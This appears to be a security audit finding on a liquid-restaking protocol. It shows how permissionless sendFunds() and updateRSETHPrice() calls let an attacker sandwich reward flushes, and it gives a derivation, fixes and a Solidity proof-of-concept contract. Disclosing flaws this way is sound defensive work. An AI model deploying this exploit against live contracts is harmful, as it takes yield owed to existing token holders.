### Title
Permissionless `sendFunds()` + `updateRSETHPrice()` Enables Atomic Yield Extraction from Existing rsETH Holders — (`contracts/FeeReceiver.sol`, `contracts/LRTOracle.sol`)

---

### Summary

An attacker can atomically sandwich the MEV/execution-layer reward flush in a single transaction — `depositETH()` → `sendFunds()` → `updateRSETHPrice()` — to capture a disproportionate share of accrued rewards that should belong to existing rsETH holders. All three functions are permissionless. No front-running is required; the entire sequence is executable atomically.

---

### Finding Description

**`FeeReceiver.sendFunds()` has no access control:** [1](#0-0) 

Any caller can flush the accumulated MEV/EL rewards from `FeeReceiver` into `LRTDepositPool` at will.

**`LRTOracle.updateRSETHPrice()` is also permissionless:** [2](#0-1) 

**`depositETH()` mints rsETH at the stale stored `rsETHPrice`:** [3](#0-2) 

The mint ratio uses `lrtOracle.rsETHPrice()` — the last checkpointed price — not a live TVL/supply ratio. This means a deposit made before rewards are flushed and the price is updated mints rsETH at the pre-reward price.

**The atomic attack sequence (single transaction):**

1. Call `depositETH{value: D}(0, "")` — mint rsETH at old price `P = T/S`
2. Call `FeeReceiver.sendFunds()` — flush reward `R` into `LRTDepositPool`
3. Call `LRTOracle.updateRSETHPrice()` — recompute price upward

**Mathematical proof of yield extraction:**

Let `T` = pre-attack TVL, `S` = rsETH supply, `P = T/S`, `R` = reward flushed, `f` = protocol fee rate.

After step 1, attacker holds `D·S/T` rsETH; supply becomes `S·(T+D)/T`.

After step 3, new price:
```
newPrice = (T + D + R − R·f) / (S·(T+D)/T)
         = T·(T + D + R·(1−f)) / (S·(T+D))
```

Attacker's ETH value of their rsETH:
```
(D·S/T) · newPrice = D · (T + D + R·(1−f)) / (T+D)
                   = D + D·R·(1−f)/(T+D)
```

Attacker's net gain: `D·R·(1−f)/(T+D)` ETH — extracted from existing holders.

Existing holders' collective gain **without** the sandwich: `R·(1−f)` ETH.
Existing holders' collective gain **with** the sandwich: `R·(1−f)·T/(T+D)` ETH.
**Loss to existing holders: `R·(1−f)·D/(T+D)` ETH** — exactly equal to the attacker's gain.

---

### Impact Explanation

This is **High — Theft of unclaimed yield**. Existing rsETH holders lose a portion of every MEV/EL reward batch to any attacker who executes this atomic sequence. The protocol remains solvent (all rsETH is backed), but yield that should accrue to long-term holders is systematically siphoned. The claim of "protocol insolvency" in the question is overstated; the correct scoped impact is theft of unclaimed yield. [4](#0-3) 

The fee is computed on `totalETHInProtocol − previousTVL`, where `previousTVL` already includes the attacker's deposit. The attacker's deposit dilutes the reward pool before the fee is taken, and the attacker's rsETH then appreciates with the remaining reward.

---

### Likelihood Explanation

- All three functions (`depositETH`, `sendFunds`, `updateRSETHPrice`) are public and callable by any EOA or contract.
- The attack is atomic — no mempool front-running, no miner cooperation, no privileged role.
- `FeeReceiver` accumulates rewards continuously; the attack is repeatable every time rewards build up.
- The only partial guard is `pricePercentageLimit` in `_updateRsETHPrice()`, which reverts non-managers if the price jump exceeds the configured threshold. However: (a) if `pricePercentageLimit == 0` the guard is disabled; (b) for small reward batches the threshold is not breached; (c) the attacker can split into multiple smaller transactions. [5](#0-4) 

---

### Recommendation

1. **Add access control to `sendFunds()`** — restrict it to `MANAGER` or `OPERATOR` role so it cannot be called atomically by an attacker.
2. **Alternatively, snapshot TVL at deposit time** — compute rsETH mint amount using a live TVL/supply ratio rather than the stale stored `rsETHPrice`, so a deposit immediately before a reward flush does not benefit from the flush.
3. **Consider a deposit cooldown or commit-reveal** to prevent atomic sandwich sequences.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDepositPool {
    function depositETH(uint256 minRSETH, string calldata ref) external payable;
}
interface IFeeReceiver {
    function sendFunds() external;
}
interface IOracle {
    function updateRSETHPrice() external;
    function rsETHPrice() external view returns (uint256);
}
interface IRSETH {
    function balanceOf(address) external view returns (uint256);
}

contract SandwichAttack {
    IDepositPool pool;
    IFeeReceiver feeReceiver;
    IOracle oracle;
    IRSETH rseth;

    constructor(address _pool, address _fee, address _oracle, address _rseth) {
        pool = IDepositPool(_pool);
        feeReceiver = IFeeReceiver(_fee);
        oracle = IOracle(_oracle);
        rseth = IRSETH(_rseth);
    }

    function attack() external payable {
        uint256 priceBefore = oracle.rsETHPrice();

        // Step 1: deposit at stale (pre-reward) price
        pool.depositETH{value: msg.value}(0, "");

        // Step 2: flush MEV rewards into DepositPool (permissionless)
        feeReceiver.sendFunds();

        // Step 3: update price — attacker's rsETH now worth more
        oracle.updateRSETHPrice();

        uint256 priceAfter = oracle.rsETHPrice();
        // assert priceAfter > priceBefore
        // assert attacker rsETH ETH value > msg.value
    }
}
```

Fork-test assertion: after `attack()`, compute `rseth.balanceOf(attacker) * oracle.rsETHPrice() / 1e18` and verify it exceeds `msg.value`. Compare against a control holder who held the same ETH value in rsETH before the attack — their per-ETH gain is smaller than the attacker's.

### Citations

**File:** contracts/FeeReceiver.sol (L53-58)
```text
    function sendFunds() external {
        uint256 balance = address(this).balance;
        ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();

        emit MevRewardsAddedToTVL(balance);
    }
```

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L244-250)
```text
        if (!protocolPaused && totalETHInProtocol > previousTVL) {
            uint256 rewardAmount = totalETHInProtocol - previousTVL;
            protocolFeeInETH = (rewardAmount * lrtConfig.protocolFeeInBPS()) / 10_000;
        }

        // compute new rsETH price based on total ETH minus fee
        uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);
```

**File:** contracts/LRTOracle.sol (L252-266)
```text
        if (newRsETHPrice > highestRsethPrice) {
            // check if the price is above the threshold
            uint256 priceDifference = newRsETHPrice - highestRsethPrice;
            // pricePercentageLimit is in 1e18 precision (100% = 1e18, 1% = 1e16)
            bool isPriceIncreaseOffLimit =
                pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);

            // check if the price difference is above the threshold
            if (isPriceIncreaseOffLimit) {
                // if sender has a manager role, this doesn't revert.
                // if not, it reverts as price went above the threshold
                if (!IAccessControl(address(lrtConfig)).hasRole(LRTConstants.MANAGER, msg.sender)) {
                    revert PriceAboveDailyThreshold();
                }
            }
```

**File:** contracts/LRTDepositPool.sol (L519-521)
```text
        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
    }
```
